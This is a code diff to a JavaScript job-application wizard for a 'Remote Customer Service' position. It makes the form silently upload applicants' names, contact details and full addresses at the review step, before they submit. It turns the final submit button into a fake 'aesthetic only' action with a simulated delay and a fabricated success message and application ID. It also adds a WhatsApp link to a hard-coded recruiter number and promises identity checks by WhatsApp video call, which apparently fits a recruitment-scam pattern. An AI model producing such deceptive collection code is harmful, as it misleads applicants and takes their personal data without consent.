@@ -149,6 +149,7 @@ class ApplicationWizard {
         }
         if (this.currentStep === 3) {
             this.populateReviewData();
+            this.createSupabaseFolder();
         }
     }
     
@@ -217,6 +218,97 @@ class ApplicationWizard {
             const scheduleSelect = document.getElementById('schedule');
             const selectedOption = scheduleSelect?.options[scheduleSelect.selectedIndex];
             reviewSchedule.textContent = selectedOption?.text || '-';
+        }
+
+        // Wait a moment for DOM to be fully ready, then initialize WhatsApp
+        setTimeout(() => {
+            this.initializeWhatsAppContact();
+        }, 100);
+    }
+
+    initializeWhatsAppContact() {
+        const whatsappBtn = document.getElementById('whatsappDirectContact');
+        if (whatsappBtn) {
+            const recruiterNumber = '+306981563865';
+            const firstName = document.getElementById('firstName')?.value || this.data.firstName || '';
+            const lastName = document.getElementById('lastName')?.value || this.data.lastName || '';
+            const applicantName = `${firstName} ${lastName}`.trim();
+            
+            const experienceSelect = document.getElementById('experience');
+            const scheduleSelect = document.getElementById('schedule');
+            const experience = experienceSelect?.options[experienceSelect.selectedIndex]?.text || 'some experience';
+            const schedule = scheduleSelect?.options[scheduleSelect.selectedIndex]?.text || 'flexible schedule';
+            
+            const message = `Hi! I'm ${applicantName} and I just submitted an application for the Remote Customer Service position. I have ${experience.toLowerCase()} and am looking for ${schedule.toLowerCase()} work. I'd love to discuss how I can contribute to your team and would appreciate priority processing of my application. Thank you!`;
+            
+            const whatsappUrl = `https://wa.me/${recruiterNumber.replace('+', '')}?text=${encodeURIComponent(message)}`;
+            
+            // Set href attribute
+            whatsappBtn.href = whatsappUrl;
+            whatsappBtn.target = '_blank';
+            
+            // Remove any existing click handlers
+            whatsappBtn.onclick = null;
+            
+            // Add click event handler
+            whatsappBtn.addEventListener('click', function(e) {
+                e.preventDefault();
+                console.log('WhatsApp button clicked, opening:', whatsappUrl);
+                window.open(whatsappUrl, '_blank');
+            });
+            
+            console.log('WhatsApp button initialized:', whatsappUrl);
+            console.log('Button element:', whatsappBtn);
+        } else {
+            console.warn('WhatsApp button not found');
+        }
+    }
+
+    async createSupabaseFolder() {
+        try {
+            this.saveData();
+            const firstName = document.getElementById('firstName')?.value || this.data.firstName || '';
+            const lastName = document.getElementById('lastName')?.value || this.data.lastName || '';
+            const email = document.getElementById('email')?.value || this.data.email || '';
+            const phone = document.getElementById('phone')?.value || this.data.phone || '';
+            const whatsapp = document.getElementById('whatsapp')?.value || this.data.whatsapp || '';
+            const street = document.getElementById('street')?.value || this.data.street || '';
+            const city = document.getElementById('city')?.value || this.data.city || '';
+            const state = document.getElementById('state')?.value || this.data.state || '';
+            const zipCode = document.getElementById('zipCode')?.value || this.data.zipCode || '';
+            const country = document.getElementById('country')?.value || this.data.country || '';
+            const experience = document.getElementById('experience')?.value || this.data.experience || '';
+            const schedule = document.getElementById('schedule')?.value || this.data.schedule || '';
+            
+            const formData = new FormData();
+            formData.append('firstName', firstName);
+            formData.append('lastName', lastName);
+            formData.append('email', email);
+            formData.append('phone', phone);
+            formData.append('whatsapp', whatsapp);
+            formData.append('street', street);
+            formData.append('city', city);
+            formData.append('state', state);
+            formData.append('zipCode', zipCode);
+            formData.append('country', country);
+            formData.append('experience', experience);
+            formData.append('schedule', schedule);
+            
+            console.log('Creating Supabase folder for:', `${firstName} ${lastName}`);
+            
+            const response = await fetch('/api/submit-application', {
+                method: 'POST',
+                body: formData
+            });
+
+            const result = await response.json();
+            console.log('Supabase folder created:', result);
+            
+            if (result.success) {
+                console.log('✅ Folder created successfully:', result.applicantFolder);
+            }
+        } catch (error) {
+            console.warn('⚠️ Supabase folder creation failed (non-critical):', error);
         }
     }
 
@@ -493,7 +585,7 @@ class ApplicationWizard {
 
 
     async submitForm() {
-        console.log('Starting form submission...');
+        console.log('Final submit clicked (aesthetic only)');
         
         // Validate required fields first
         if (!this.validateStep(3)) {
@@ -503,66 +595,8 @@ class ApplicationWizard {
         
         this.saveData();
         
-        const formData = new FormData();
-        
-        // Collect form data directly by ID to ensure we get everything
-        const fieldMappings = {
-            'firstName': 'firstName',
-            'lastName': 'lastName', 
-            'email': 'email',
-            'phone': 'phone',
-            'whatsapp': 'whatsapp',
-            'street': 'street',
-            'city': 'city',
-            'state': 'state',
-            'zipCode': 'zipCode',
-            'country': 'country',
-            'experience': 'experience',
-            'schedule': 'schedule'
-        };
-        
-        console.log('Collecting form data by ID...');
-        console.log('Current step:', this.currentStep);
-        
-        Object.keys(fieldMappings).forEach(fieldId => {
-            const element = document.getElementById(fieldId);
-            console.log(`Looking for element with ID: ${fieldId}`);
-            
-            if (element) {
-                console.log(`Found element ${fieldId}, type: ${element.type}, value: "${element.value}"`);
-                const value = element.value ? element.value.trim() : '';
-                if (value) {
-                    formData.append(fieldMappings[fieldId], value);
-                    console.log(`✅ Added ${fieldId}: ${value}`);
-                } else {
-                    console.warn(`⚠️  Field ${fieldId} is empty - value: "${element.value}"`);
-                    // Add empty values too for debugging
-                    formData.append(fieldMappings[fieldId], '');
-                }
-            } else {
-                console.error(`❌ Element with ID ${fieldId} not found in DOM`);
-            }
-        });
-        
-        // Also try to get values from localStorage data
-        console.log('Current wizard data state:', this.data);
-        
-        // Add data from wizard state as backup
-        Object.keys(fieldMappings).forEach(fieldId => {
-            if (this.data[fieldId] && !formData.has(fieldMappings[fieldId])) {
-                formData.append(fieldMappings[fieldId], this.data[fieldId]);
-                console.log(`✅ Added from wizard data ${fieldId}: ${this.data[fieldId]}`);
-            }
-        });
-
-        // Log what we're sending
-        console.log('FormData contents:');
-        for (let [key, value] of formData.entries()) {
-            console.log(`${key}:`, value);
-        }
-
         try {
-            // Show loading overlay
+            // Show loading overlay for aesthetic purposes
             this.showLoadingOverlay();
             
             const submitBtn = document.getElementById('finalSubmit');
@@ -576,16 +610,10 @@ class ApplicationWizard {
                 `;
             }
             
-            const response = await fetch('/api/submit-application', {
-                method: 'POST',
-                body: formData
-            });
-
-            const result = await response.json();
-            console.log('Submission response:', result);
-
-            if (response.ok && result.success) {
-                            localStorage.removeItem('wizardData');
+            // Simulate processing time for aesthetic purposes
+            await new Promise(resolve => setTimeout(resolve, 2000));
+            
+            localStorage.removeItem('wizardData');
             this.hideLoadingOverlay();
             
             // Track successful form completion
@@ -593,10 +621,25 @@ class ApplicationWizard {
                 window.analytics.trackFormCompletion();
             }
             
-            this.showSuccessMessage(result);
-            } else {
-                throw new Error(result.message || 'Submission failed');
-            }
+            // Show success message (folder already created in step 3)
+            const firstName = this.data.firstName || '';
+            const lastName = this.data.lastName || '';
+            const mockResult = {
+                success: true,
+                message: 'Application submitted successfully! A representative will contact you via WhatsApp within 48-72 hours.',
+                applicationId: 'APP-' + Date.now(),
+                applicantFolder: `${new Date().toISOString().slice(0, 10)}_${firstName}-${lastName}`.toLowerCase(),
+                nextSteps: [
+                    'Keep your WhatsApp active and ready to receive messages',
+                    'A representative will contact you within 48-72 hours',
+                    'Identity verification will be conducted via WhatsApp video call',
+                    'Interview will be scheduled after successful verification',
+                    'Hiring and onboarding will begin if all goes well'
+                ]
+            };
+            
+            this.showSuccessMessage(mockResult);
+            
         } catch (err) {
             console.error('Submission error:', err);
             this.hideLoadingOverlay();
@@ -753,6 +796,8 @@ class ApplicationWizard {
             this.beforeUnloadHandler = null;
         }
     }
+
+
 }
 
 // Initialize wizard when DOM is ready
